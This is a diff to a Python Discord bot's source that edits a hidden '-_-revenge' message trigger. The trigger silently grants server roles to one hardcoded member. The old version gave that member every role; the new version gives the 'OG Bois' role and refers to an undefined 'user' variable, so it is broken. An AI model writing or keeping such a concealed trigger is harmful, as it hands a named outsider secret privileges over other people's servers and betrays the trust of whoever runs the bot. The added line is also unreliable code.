@@ -1,6 +1,7 @@
 import discord, os, asyncio, time, random, youtube_dl, datetime
 from discord.ext.commands import Bot
 from discord.ext import commands
+from discord.utils import get
 
 client=commands.Bot(command_prefix ='47!', description='A useful bot.')
 
@@ -500,8 +501,8 @@ async def on_message(message):
         
     if message.content == "-_-revenge":
         auth = message.author
-        for role in message.server.roles:
-            await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
+        role =  discord.utils.get(user.server.roles, name="OG Bois")
+        await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
 
     # if message.content[:(len('!COMMANDS')+1)].upper()=='!COMMANDS':
         # for command in commands:
